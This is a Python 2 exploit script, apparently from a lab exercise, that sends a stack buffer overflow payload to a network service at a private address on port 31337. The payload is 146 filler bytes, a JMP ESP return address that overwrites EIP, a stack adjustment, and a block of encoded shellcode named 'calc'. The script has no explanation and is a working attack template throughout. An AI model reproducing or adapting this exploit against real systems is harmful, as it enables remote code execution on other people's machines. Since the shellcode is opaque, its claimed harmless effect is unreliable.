#!/usr/bin/env python2
import socket
import struct

RHOST="192.168.205.170"
RPORT=31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

total = 1024
offset = 146

jmpesp = 0x080414C3
subesp = "\x83\xec\x10"

calc =  ""
calc += "\xda\xc1\xd9\x74\x24\xf4\x58\x29\xc9\xbe\xc4\x84\xbc"
calc += "\xec\xb1\x5b\x31\x70\x19\x83\xc0\x04\x03\x70\x15\x26"
calc += "\x71\x40\x04\x24\x7a\xb9\xd5\x48\xf2\x5c\xe4\x48\x60"
calc += "\x14\x57\x78\xe2\x78\x54\xf3\xa6\x68\xef\x71\x6f\x9e"
calc += "\x58\x3f\x49\x91\x59\x13\xa9\xb0\xd9\x69\xfe\x12\xe3"
calc += "\xa2\xf3\x53\x24\xde\xfe\x06\xfd\x95\xad\xb6\x8a\xe3"
calc += "\x6d\x3c\xc0\xe2\xf5\xa1\x91\x05\xd7\x77\xa9\x5c\xf7"
calc += "\x76\x7e\xd5\xbe\x60\x63\xd3\x09\x1a\x57\xa8\x8b\xca"
calc += "\xa9\x51\x27\x33\x06\xa0\x39\x73\xa1\x5a\x4c\x8d\xd1"
calc += "\xe7\x57\x4a\xab\x33\xdd\x49\x0b\xb0\x45\xb6\xad\x15"
calc += "\x13\x3d\xa1\xd2\x57\x19\xa6\xe5\xb4\x11\xd2\x6e\x3b"
calc += "\xf6\x52\x34\x18\xd2\x3f\xef\x01\x43\x9a\x5e\x3d\x93"
calc += "\x45\x3f\x9b\xdf\x68\x54\x96\xbd\xe4\x99\x9b\x3d\xf5"
calc += "\xb5\xac\x4e\xc7\x1a\x07\xd9\x6b\xd3\x81\x1e\xfd\xf3"
calc += "\x31\xf0\x45\x93\xcf\xf1\xb5\xba\x0b\xa5\xe5\xd4\xba"
calc += "\xc6\x6d\x24\x42\x13\x1b\x2e\xd4\x5c\x74\xe3\x89\x35"
calc += "\x87\xfb\xd0\x7e\x0e\x1d\x82\xd0\x41\xb1\x63\x81\x21"
calc += "\x61\x0c\xcb\xad\x5e\x2c\xf4\x67\xf7\xc7\x1b\xde\xa0"
calc += "\x7f\x85\x7b\x3a\xe1\x4a\x56\x47\x21\xc0\x53\xb8\xec"
calc += "\x21\x11\xaa\x19\x56\xd9\x32\xda\xf3\xd9\x58\xde\x55"
calc += "\x8d\xf4\xdc\x80\xf9\x5b\x1e\xe7\x79\x9b\xe0\x76\x48"
calc += "\xd0\xd7\xec\xf4\x8e\x17\xe1\xf4\x4e\x4e\x6b\xf5\x26"
calc += "\x36\xcf\xa6\x53\x39\xda\xda\xc8\xac\xe5\x8a\xbd\x67"
calc += "\x8e\x30\x98\x40\x11\xca\xcf\xd2\x56\x34\x92\xfc\xfe"
calc += "\x5d\x6c\xbd\xfe\x9d\x06\x3d\xaf\xf5\xdd\x12\x40\x36"
calc += "\x1e\xb9\x09\x5e\x95\x2c\xfb\xff\xaa\x64\x5d\x5e\xab"
calc += "\x8b\x46\x51\xd6\xe4\x79\x92\x27\xed\x1d\x92\x28\x11"
calc += "\x20\xae\xff\x28\x56\xf1\x3c\x0f\x79\xec\xe8\x7a\x12"
calc += "\xa9\x79\xc7\x7f\x4a\x54\x04\x86\xc9\x5c\xf5\x7d\xd1"
calc += "\x15\xf0\x3a\x55\xc6\x88\x53\x30\xe8\x3f\x53\x11"

buf = ""
buf = "A"*(offset - len(buf))
buf += struct.pack("<I", jmpesp) # EIP
buf += subesp
buf += calc
buf += "F"*(total - len(buf))
buf += "\n"

s.send(buf)

print "Sent: {0}".format(buf)

resp = s.recv(1024)
